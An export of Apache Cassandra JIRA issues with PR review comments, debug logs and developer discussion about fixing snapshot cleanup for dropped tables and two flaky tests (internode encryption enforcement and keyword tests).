 import org.apache.cassandra.distributed.shared.WithProperties;
 
+import static java.util.concurrent.TimeUnit.SECONDS;
+import static org.apache.cassandra.db.ColumnFamilyStore.SNAPSHOT_DROP_PREFIX;
 import static org.apache.cassandra.distributed.shared.ClusterUtils.stopUnchecked;
+import static org.awaitility.Awaitility.await;
 
 public class SnapshotsTest extends TestBaseImpl

Review Comment:
   good catch - added new test on 834229664d6c2b3b6a044e7fd2571eca48df6a74



;12/May/22 21:03;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r872710360


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}"", snapshots.stream().map(s -> s.getId()).collect(Collectors.toList()));

Review Comment:
   Ehm ... should not it be the name of the snapshot rather than keyspace:table:id? I mean, we are adding _snapshots_, I do not see the _names_ of these snapshots or am I getting something wrong?



;13/May/22 19:17;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r872711659


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,16 +109,24 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}."", Joiner.on("", "").join(snapshots.stream().map(s -> s.getId()).collect(Collectors.toList())));

Review Comment:
   this looks better but what I see is that we have ""keyspace:table:id"" rather than _name of that snapshot_ (snapshot tag).



;13/May/22 19:19;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r872714219


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,16 +109,24 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}."", Joiner.on("", "").join(snapshots.stream().map(s -> s.getId()).collect(Collectors.toList())));

Review Comment:
   Ahaaaa I get this, so after ""id"" there is the snapshot tag, the whole name has four components, ks:tb:id:tag. I overlooked the last part. All good.



;13/May/22 19:23;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r872714219


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,16 +109,24 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}."", Joiner.on("", "").join(snapshots.stream().map(s -> s.getId()).collect(Collectors.toList())));

Review Comment:
   Ahaaaa I get this, so after ""id"" there is the snapshot tag, the whole name has four components, `ks:tb:id:tag`. I overlooked the last part. All good.



;13/May/22 19:25;githubbot;600","smiklosovic closed pull request #1615: CASSANDRA-17619: Remove expired snapshots of dropped tables after restart
URL: https://github.com/apache/cassandra/pull/1615


;17/Jun/22 07:38;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7800,,,0,7800,,,,,,,,,,,,,,,,,CASSANDRA-17769,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,paulo,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 27 18:36:18 UTC 2022,,,,,,,All,,,,"0|z128fk:",9223372036854775807,,,,smiklosovic,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/a604c0d4defb50ffdf7f66c3ac372eb14f39ba3b,,,,,,,,,unit tests,,,,,"10/May/22 15:32;paulo;This was working correctly in the initial implementation of CASSANDRA-16843, but ended up getting removed when I simplified the patch in the final review pass.

I added a few regression tests [on this commit|https://github.com/pauloricardomg/cassandra/commit/dd10697ecdd234ddbbbbe032fc076f36787c9197] reproducing the issue with both auto_snapshots and manual snapshots.

The fix is straightforward: just use the new {{SnapshotLoader}} implementation when doing the initial snapshot load on {{{}SnapshotManager{}}}, which loads snapshots of dropped tables correctly ([commit|https://github.com/pauloricardomg/cassandra/commit/6731ee21b79b2345274307e2ba8800f50eb36a98]).;;;","10/May/22 15:39;paulo;|[PR|https://github.com/apache/cassandra/pull/1615]|[4.1 CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1701/]|[trunk CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1702/]|

[~smiklosovic] mind taking a look?;;;","10/May/22 19:48;smiklosovic;Thanks Paulo, I did the review. Waiting for your feedback.;;;","12/May/22 21:05;paulo;Addressed review comments on github [PR|https://github.com/apache/cassandra/pull/1615] and fixed two extra nits found during testing:
 * [fix log|https://github.com/apache/cassandra/pull/1615/commits/333f813f6872b87f7e0f79f71a4f9688a9cc3193]
 * [Add verbose log to trace|https://github.com/apache/cassandra/pull/1615/commits/c2d7c679c3492b66d41f8c60ce29d38efdf1c88e]

This is what the output of nodetool listsnapshots looks like after doing the following operations:
 * global snapshot of all keyspaces
 * drop keyspace ks2 with auto_snapshot_ttl unset
 * drop keyspace ks1 with auto_snapshot_ttl=1 minute
 * nodetool snapshots

{noformat}
grep -v ""all_keyspaces_snapshot"" snapshot.txt
Snapshot Details:
Snapshot name                   Keyspace name      Column family name             True size Size on disk Creation time            Expiration time
dropped-1652386867075-my_table  ks2                my_table                       5.81 KiB  5.81 KiB     2022-05-12T20:21:07.075Z
dropped-1652388565491-my_table  ks                 my_table                       5.83 KiB  5.83 KiB     2022-05-12T20:49:25.491Z 2022-05-12T20:50:25.491Z
dropped-1652388565604-my_table2 ks                 my_table2                      5.83 KiB  5.83 KiB     2022-05-12T20:49:25.604Z 2022-05-12T20:50:25.604Z
dropped-1652386867016-my_table2 ks2                my_table2                      5.81 KiB  5.81 KiB     2022-05-12T20:21:07.016Z

Total TrueDiskSpaceUsed: 0 byte
pmottagomes@C02FD3GTMD6R Documents %
{noformat}
After this I restarted the node and verified the snapshot from ks1 was removed after 1 minute:
{noformat}
Snapshot Details:
Snapshot name                   Keyspace name      Column family name             True size Size on disk Creation time            Expiration time
dropped-1652386867075-my_table  ks2                my_table                       5.81 KiB  5.81 KiB     2022-05-12T20:21:07.075Z
dropped-1652386867016-my_table2 ks2                my_table2                      5.81 KiB  5.81 KiB     2022-05-12T20:21:07.016Z

Total TrueDiskSpaceUsed: 0 bytes
{noformat}
This is the debug logs of the manual test above:
{noformat}
DEBUG [main] 2022-05-12 17:51:07,265 SnapshotManager.java:119 - Adding snapshots: system:peers:37f71aca-7dc2-383b-a706-72528af04d4f:all_keyspaces_snapshot, system:transferred_ranges:6cad20f7-d4f5-3af2-b6e2-0da33c6c1f83:all_keyspaces_snapshot, system_traces:sessions:c5e99f16-8677-3914-b17e-960613512345:all_keyspaces_snapshot, system_schema:dropped_columns:5e7583b5-f3f4-3af1-9a39-b7e1d6f5f11f:all_keyspaces_snapshot, system_auth:role_members:0ecdaa87-f8fb-3e60-88d1-74fb36fe5c0d:all_keyspaces_snapshot, ks:my_table2:74a02c00-d230-11ec-b12d-d9d82874084f:dropped-1652388565604-my_table2, system:repairs:a3d277d1-cfaf-36f5-a2a7-38d5eea9ad6a:all_keyspaces_snapshot, ks2:my_table2:846d1fd0-d230-11ec-b12d-d9d82874084f:all_keyspaces_snapshot, system:IndexInfo:9f5c6374-d485-3229-9a0a-5094af9ad1e3:all_keyspaces_snapshot, system_schema:functions:96489b79-80be-3e14-a701-66a0b9159450:all_keyspaces_snapshot, system:top_partitions:7e5a361c-317c-351f-b15f-ffd8afd3dd4b:all_keyspaces_snapshot, system:peers_v2:c4325fbb-8e5e-3baf-bd07-0f9250ed818e:all_keyspaces_snapshot, system_distributed:partition_denylist:d6123acc-8649-3496-9d4e-f3fe39a6018b:all_keyspaces_snapshot, system_schema:views:9786ac1c-dd58-3201-a7cd-ad556410c985:all_keyspaces_snapshot, system_auth:resource_role_permissons_index:5f2fbdad-91f1-3946-bd25-d5da3a5c35ec:all_keyspaces_snapshot, system_schema:columns:24101c25-a2ae-3af7-87c1-b40ee1aca33f:all_keyspaces_snapshot, system:transferred_ranges_v2:1ff78f1a-7df1-3a2a-a998-6f4932270af5:all_keyspaces_snapshot, system:prepared_statements:18a9c257-6a0c-3841-ba71-8cd529849fef:all_keyspaces_snapshot, system:local:7ad54392-bcdd-35a6-8417-4e047860b377:all_keyspaces_snapshot, system_schema:types:5a8b1ca8-6602-3f77-a045-9273d308917a:all_keyspaces_snapshot, ks2:my_table:8eada2d0-d230-11ec-b12d-d9d82874084f:dropped-1652386867075-my_table, system:size_estimates:618f817b-005f-3678-b8a4-53f3930b8e86:all_keyspaces_snapshot, ks2:my_table:8eada2d0-d230-11ec-b12d-d9d82874084f:all_keyspaces_snapshot, system:peer_events:59dfeaea-8db2-3341-91ef-109974d81484:all_keyspaces_snapshot, system_auth:roles:5bc52802-de25-35ed-aeab-188eecebb090:all_keyspaces_snapshot, system_schema:indexes:0feb57ac-311f-382f-ba6d-9024d305702f:all_keyspaces_snapshot, system_schema:keyspaces:abac5682-dea6-31c5-b535-b3d6cffd0fb6:all_keyspaces_snapshot, system:table_estimates:176c39cd-b93d-33a5-a218-8eb06a56f66e:all_keyspaces_snapshot, system_auth:network_permissions:d46780c2-2f1c-3db9-b4c1-b8d9fbc0cc23:all_keyspaces_snapshot, ks:my_table:704a1850-d230-11ec-b12d-d9d82874084f:dropped-1652388565491-my_table, system:available_ranges:c539fcab-d65a-31d1-8133-d25605643ee3:all_keyspaces_snapshot, ks:my_table:704a1850-d230-11ec-b12d-d9d82874084f:all_keyspaces_snapshot, system_schema:aggregates:924c5587-2e3a-345b-b10c-12f37c1ba895:all_keyspaces_snapshot, system:view_builds_in_progress:6c22df66-c3bd-3df6-b74d-21179c6a9fe9:all_keyspaces_snapshot, system:batches:919a4bc5-7a33-3573-b03e-13fc3f68b465:all_keyspaces_snapshot, system:available_ranges_v2:4224a088-2ac9-3d0c-889d-fbb5f0facda0:all_keyspaces_snapshot, system_distributed:view_build_status:5582b59f-8e4e-35e1-b913-3acada51eb04:all_keyspaces_snapshot, system:peer_events_v2:0e65065f-e401-38ed-9507-b9213fae8d11:all_keyspaces_snapshot, system:paxos:b7b7f0c2-fd0a-3410-8c05-3ef614bb7c2d:all_keyspaces_snapshot, system:paxos_repair_history:ecb86667-40b2-3316-bb91-e612c8047457:all_keyspaces_snapshot, system:built_views:4b3c50a9-ea87-3d76-9101-6dbc9c38494a:all_keyspaces_snapshot, system_traces:events:8826e8e9-e16a-3728-8753-3bc1fc713c25:all_keyspaces_snapshot, system:sstable_activity:5a1ff267-ace0-3f12-8563-cfae6103c65e:all_keyspaces_snapshot, ks2:my_table2:846d1fd0-d230-11ec-b12d-d9d82874084f:dropped-1652386867016-my_table2, system_schema:triggers:4df70b66-6b05-3251-95a1-32b54005fd48:all_keyspaces_snapshot, system_distributed:repair_history:759fffad-624b-3181-80ee-fa9a52d1f627:all_keyspaces_snapshot, system_distributed:parent_repair_history:deabd734-b99d-3b9c-92e5-fd92eb5abf14:all_keyspaces_snapshot, system_schema:tables:afddfb9d-bc1e-3068-8056-eed6c302ba09:all_keyspaces_snapshot, system:compaction_history:b4dbb7b4-dc49-3fb5-b3bf-ce6e434832ca:all_keyspaces_snapshot, system:sstable_activity_v2:62efe31f-3be8-310c-8d29-8963439c1288:all_keyspaces_snapshot, system_auth:role_permissions:3afbe79f-2194-31a7-add7-f5ab90d8ec9c:all_keyspaces_snapshot, ks:my_table2:74a02c00-d230-11ec-b12d-d9d82874084f:all_keyspaces_snapshot.
DEBUG [main] 2022-05-12 17:51:07,266 SnapshotManager.java:104 - Adding expiring snapshot TableSnapshot{keyspaceName='ks', tableName='my_table2', tableId=74a02c00-d230-11ec-b12d-d9d82874084f, tag='dropped-1652388565604-my_table2', createdAt=2022-05-12T20:49:25.604Z, expiresAt=2022-05-12T20:50:25.604Z, snapshotDirs=[/Users/pmottagomes/.ccm/test/node1/data0/ks/my_table2-74a02c00d23011ecb12dd9d82874084f/snapshots/dropped-1652388565604-my_table2]}
DEBUG [main] 2022-05-12 17:51:07,266 SnapshotManager.java:104 - Adding expiring snapshot TableSnapshot{keyspaceName='ks', tableName='my_table', tableId=704a1850-d230-11ec-b12d-d9d82874084f, tag='dropped-1652388565491-my_table', createdAt=2022-05-12T20:49:25.491Z, expiresAt=2022-05-12T20:50:25.491Z, snapshotDirs=[/Users/pmottagomes/.ccm/test/node1/data0/ks/my_table-704a1850d23011ecb12dd9d82874084f/snapshots/dropped-1652388565491-my_table]}
INFO  [main] 2022-05-12 17:51:07,266 SnapshotManager.java:128 - Scheduling expired snapshot cleanup with initialDelaySeconds={} and cleanupPeriodSeconds={}
DEBUG [SnapshotCleanup:1] 2022-05-12 17:51:12,269 SnapshotManager.java:141 - Removing expired snapshot TableSnapshot{keyspaceName='ks', tableName='my_table', tableId=704a1850-d230-11ec-b12d-d9d82874084f, tag='dropped-1652388565491-my_table', createdAt=2022-05-12T20:49:25.491Z, expiresAt=2022-05-12T20:50:25.491Z, snapshotDirs=[/Users/pmottagomes/.ccm/test/node1/data0/ks/my_table-704a1850d23011ecb12dd9d82874084f/snapshots/dropped-1652388565491-my_table]}.
DEBUG [SnapshotCleanup:1] 2022-05-12 17:51:12,274 SnapshotManager.java:141 - Removing expired snapshot TableSnapshot{keyspaceName='ks', tableName='my_table2', tableId=74a02c00-d230-11ec-b12d-d9d82874084f, tag='dropped-1652388565604-my_table2', createdAt=2022-05-12T20:49:25.604Z, expiresAt=2022-05-12T20:50:25.604Z, snapshotDirs=[/Users/pmottagomes/.ccm/test/node1/data0/ks/my_table2-74a02c00d23011ecb12dd9d82874084f/snapshots/dropped-1652388565604-my_table2]}.
{noformat}
I will create another ticket to fix the order items are displayed in nodetool listsnapshots. Also we should probably expose nodetool listsnapshots output via a virtual table.;;;","12/May/22 21:20;paulo;Previous CI did not complete due to OOM.

Resubmitted new CI on rebased patch:
|[CASSANDRA-17619-4.1-rebased|https://github.com/pauloricardomg/cassandra/tree/CASSANDRA-17619-4.1-rebased]|[4.1 CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1704/]|

;;;","13/May/22 19:21;smiklosovic;-I reviewed again, I have one minor issue / question otherwise when addressed / resolved I am +1. Thanks a lot!-

+1. I overlooked the last component of the logs where snapshot tag is.;;;","20/May/22 12:20;paulo;Hi[~smiklosovic] , do you mind committing this? I don’t have access to a computer until next week.

The latest posted branch is squashed and prepared for commit.

Thanks

 

==



Sent from Jira Mobile;;;","20/May/22 15:42;smiklosovic;Yes, I will commit it. No worries.;;;","21/May/22 18:11;smiklosovic;[~paulo] I ve run one more circle job for 4.1 with rebased stuff and this is what I got. Check the first failed test there. It can not load snapshots as there is ""no file found exception"". I am not completely sure about the anatomy of that test yet but this is quite weird that we are getting this exception.

I think it is just flaky as locally it just went fine.

It seems like we were about to load the snapshots and it was walking the tree but all of sudden these files were deleted under its hands.

Maybe it is caused by the node starting and compacting some sstables as part of the start (yeah that might happen) and it just clashes with snapshot loader doing its job.

[https://app.circleci.com/pipelines/github/instaclustr/cassandra/976/workflows/1fd26858-c5ad-44f3-bab3-2318da3bd729/jobs/4226/tests];;;","21/May/22 19:24;smiklosovic;[~paulo]  I tried to fix it here

[https://github.com/instaclustr/cassandra/commit/d04390a64b4d4d986804282fb82d60578919cad4]

I run repeated test here: [https://app.circleci.com/pipelines/github/instaclustr/cassandra/977/workflows/b6399095-7ce6-435c-aeaa-3dac55f287a7/jobs/4231/parallel-runs/0?filterBy=ALL];;;","22/May/22 17:59;paulo;Nice catch - it seems this also failed on ASF CI ([PreviewRepairCoordinatorNeighbourDownTest.validationParticipentCrashesAndComesBack|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1704/testReport/junit/org.apache.cassandra.distributed.test/PreviewRepairCoordinatorNeighbourDownTest/validationParticipentCrashesAndComesBack_SEQUENTIAL_true__2/]). 

The fix looks good to me.

Submitted one full run to check if failures are fixed:
* https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1729/;;;","23/May/22 07:56;smiklosovic;Seems to be fixed. I will merge it when 4.1-alpha1 is released.;;;","23/May/22 10:08;brandon.williams;bq.  I will merge it when 4.1-alpha1 is released.

Just curious, why does the release gate committing here?;;;","23/May/22 10:20;smiklosovic;Well ... because it is not fully out yet and Mick just tagged it by -tentative, if he still has some work to do related to releasing, I just do not want to mess with my stuff in the middle. He just tagged it, 4.1-alpha1 is not a branch, right?;;;","23/May/22 10:34;brandon.williams;You shouldn't worry about any of that, unless you're trying to get something _into_ alpha1.;;;","23/May/22 12:18;smiklosovic;[~paulo] there is still this (1). There is one more case of this faulty comparision later in that method. Do not you have your IDEA set up in such a way that it will automatically hightlight this?

{code}
        return subdir.getFileName().equals(Directories.BACKUPS_SUBDIR)
               ? FileVisitResult.SKIP_SUBTREE
               : FileVisitResult.CONTINUE;
{code}

I will fix it as part of this patch. It is very minor bug which will just scan backup dirs but they should not be.

(1) https://github.com/apache/cassandra/pull/1595#discussion_r861730641;;;","23/May/22 12:21;paulo;bq. I will fix it as part of this patch. It is very minor bug which will just scan backup dirs but they should not be.

Sounds good, nice catch!;;;","25/May/22 06:08;smiklosovic;I ve changed some tests as well, made it more solid, they were flaky a bit, i saw a circle which failed, I will wrap it following days, just busy.;;;","27/May/22 18:00;paulo;bq. I ve changed some tests as well, made it more solid, they were flaky a bit, i saw a circle which failed, I will wrap it following days, just busy.

Thanks for the heads up. Can you give more details on what tests were flaky and why?

It may be worth to multiplex the snapshot test suites to verify they're not flaky before committing.;;;","27/May/22 18:36;smiklosovic;I run the tests like 50 times, the same one
https://github.com/instaclustr/cassandra/commit/7017450d092f7a111239020fca5d7b76529239ee

Basically, some snapshot operation was done via nodetool and then it was asserting some state but it was not done yet / it was / was not in the output and it was throwing exceptions. I had to rewrite it like we are waiting for some state to happen.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest,CASSANDRA-17618,13444184,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,10/May/22 14:14,05/Oct/22 22:22,13/Jul/23 08:40,06/Sep/22 17:01,4.1-beta1,5.0,,,,,CI,,,,0,,"The test is flaky on 4.1:
https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1604/workflows/243a20a5-eda2-4c28-95e8-ab6c4f85a891/jobs/10911


{code:java}
junit.framework.AssertionFailedError: expected:<0> but was:<1>
	at org.apache.cassandra.distributed.test.InternodeEncryptionEnforcementTest.lambda$testConnectionsAreRejectedWithInvalidConfig$81c80a4a$1(InternodeEncryptionEnforcementTest.java:91)
	at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
{code}
",,adelapena,aleksey,e.dimitrova,jlewandowski,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17044,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Sep 06 17:01:54 UTC 2022,,,,,,,All,,,,"0|z128co:",9223372036854775807,,,,aleksey,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/46700918f8faec82f231aa15ff719c58e5f1ee95,,,,,,,,,run CI,,,,,"10/May/22 14:15;e.dimitrova;I reproduced on 4.1 this failure but I guess whoever assigns the ticket might want to check also other branches.;;;","31/May/22 14:56;brandon.williams;So far, I can confirm that this only exists in 4.1+, and will not reproduce in a reasonable amount of runs with 2 cores, but reliably with 8.;;;","01/Jun/22 22:00;brandon.williams;This looks like it was broken in CASSANDRA-17044.  [Here|https://app.circleci.com/pipelines/github/driftx/cassandra/508/workflows/59f6dfb4-4d12-4320-8312-7d42bbb3043c/jobs/5899] are 500 runs on the commit just before it that succeed, and [here|https://app.circleci.com/pipelines/github/driftx/cassandra/509/workflows/612d851b-f163-4c0c-bfa7-1690d652c012/jobs/5900/parallel-runs/2?filterBy=ALL] are 500 against it where there were 3 failures. [~jlewandowski] [~ifesdjeen] can you take a look?;;;","22/Jun/22 07:45;jlewandowski;[~brandon.williams] by 8 cores do you mean setting {{-XX:ActiveProcessorCount=8}} ?;;;","22/Jun/22 10:59;brandon.williams;No, I just used a bigger machine.  I was initially attacking with multiple machines and noticed that the smaller ones were not having any luck and impeding my progress.;;;","22/Jun/22 12:50;jlewandowski;thanks;;;","28/Jul/22 19:33;e.dimitrova;Another failure from this class today - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1822/workflows/1eb7101f-dc32-4e87-88a8-f1660bb5c221/jobs/13916/tests#failed-test-0;;;","26/Aug/22 18:34;brandon.williams;Though this bisected to CASSANDRA-17044, I think it just changed the timing enough to expose other problems.  The first is a race that is mostly noise and is just like [this one|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/InboundConnectionInitiator.java#L464], but instead [here|https://github.com/driftx/cassandra/commit/568f2166f84908f1c7f240d6f2f7de0591d46a59].  The second issue is that when a connection is attempted unencrypted we call [failHandshake|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/InboundConnectionInitiator.java#L320] but don't return afterward, which then relies on a later write to call [exceptionCaught|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/InboundConnectionInitiator.java#L339] which it seems in some instances is too late and allows [setupMessagingPipeline|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/net/InboundConnectionInitiator.java#L357] to run, causing the messageHandler to be present when the test checks them.  I don't see any reason to not return after failing, but there are other instances where we don't and this isn't my area of expertise. [~aleksey] this is your test, can you advise?
;;;","29/Aug/22 19:33;brandon.williams;I went ahead and tried the 'return after fail' method since that made the most sense to me, and it makes the check on node1 exactly like the one for node2 in the test, since the messageHandlers will now be empty.  It seems like being present before and checking with a count of zero was perhaps working around the fact that they were not empty.

||Branch||CI||
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17618-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/623/workflows/9f589855-8f3b-4239-88a9-11f6e9ea50f7], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/623/workflows/4bd7bedc-732d-4c5c-8df2-c389db855db0], [+500|https://app.circleci.com/pipelines/github/driftx/cassandra/623/workflows/480c81d2-5689-4ac5-ab1f-7e0b1e82c584/jobs/7095]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17618-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/624/workflows/7f3170f6-6471-43aa-aceb-6801b2fbc6e6], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/624/workflows/808dbc03-55a8-465b-9ce2-e1ae1f2d1a6a]|;;;","31/Aug/22 14:29;adelapena;The fix looks good to me, but I'm not very familiarized with that area of the code, so maybe someone else (like [~aleksey] ) can take a look.;;;","06/Sep/22 16:46;aleksey;bq. I don't see any reason to not return after failing, but there are other instances where we don't and this isn't my area of expertise. Aleksey Yeschenko this is your test, can you advise?

Your instinct feels right, I think the returns here are the right call. LGTM;;;","06/Sep/22 17:01;brandon.williams;Committed, thanks for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky org.apache.cassandra.cql3.KeywordTest,CASSANDRA-17615,13444017,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,e.dimitrova,e.dimitrova,09/May/22 15:59,27/May/22 19:24,13/Jul/23 08:40,18/May/22 06:47,4.0.5,4.1,4.1-alpha1,5.0,,,CI,,,,0,,"The tests in this class fail very often with:
h3.  
{code:java}
Error Message
Timeout occurred. Please note the time in the report does not reflect the time until the timeout.

Stacktrace
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout. at java.util.Vector.forEach(Vector.java:1277) at java.util.Vector.forEach(Vector.java:1277) at java.util.Vector.forEach(Vector.java:1277) at org.apache.cassandra.anttasks.TestHelper.execute(TestHelper.java:53) at java.util.Vector.forEach(Vector.java:1277)
{code}
 

I don't think I've seen them failing in CircleCI, but I see different tests from the class in Jenkins timing out. 

Example:

[https://jenkins-cm4.apache.org/job/Cassandra-4.1/5/testReport/junit/org.apache.cassandra.cql3/KeywordTest/test_keyword_MODIFY_isReserved_true_/]

 ",,bereng,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu May 19 04:28:20 UTC 2022,,,,,,,All,,,,"0|z127co:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,4.0.4,,https://github.com/apache/cassandra/commit/27b5a017eaeb692cead5266cef43175b729fbe88,,,,,,,,,See PR,,,,,"09/May/22 16:11;brandon.williams;I considered making this ticket because I feel like these timeout an unusual amount too - but ultimately I looped this on unburdened hardware quite a few times and was never able to reproduce.;;;","09/May/22 16:14;e.dimitrova;Same here, I've seen them only in Jenkins so far. But yes, they seem a lot of noise so figured it is good to handle them. Not a release blocker probably. But good to have a placeholder ticket and to  be known they are under the radar. ;;;","12/May/22 08:24;bereng;I've been on this test before. It's just a brute force and long one so it's not a test issue imo but the env timming it out. I can only think about splitting the test into multiple files to bring down execution time like we've done with others. Would you see that with good eyes?;;;","12/May/22 11:38;brandon.williams;That sounds good to me.;;;","12/May/22 14:49;e.dimitrova;It seems the assertions time out, not the test? What do I miss?;;;","13/May/22 05:36;bereng;To me it reads like an ant timeout, so a test timeout.;;;","13/May/22 10:30;bereng;I gave it a go [here|https://github.com/apache/cassandra/pull/1625]. wdyt?;;;","13/May/22 10:59;brandon.williams;I guess let's give it a jenkins run since we can't multiplex there and it doesn't fail elsewhere.;;;","13/May/22 12:14;bereng;Let's [see|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1707/];;;","16/May/22 06:49;bereng;LGTM, I moved to patch available in hope I didn't miss anything;;;","16/May/22 10:35;brandon.williams;Looks good.  Let's do a 4.1 and trunk run to be safe and then ship it.;;;","17/May/22 07:42;bereng;Added both! :-);;;","17/May/22 11:00;brandon.williams;LGTM, +1.;;;","18/May/22 17:45;jmckenzie;CI is kind of a hot mess right now. On the plus side, KeywordTest didn't fail on the ASF Jenkins run for this patch. :)

[CI Results]
Branch: 4.1, build number: 24
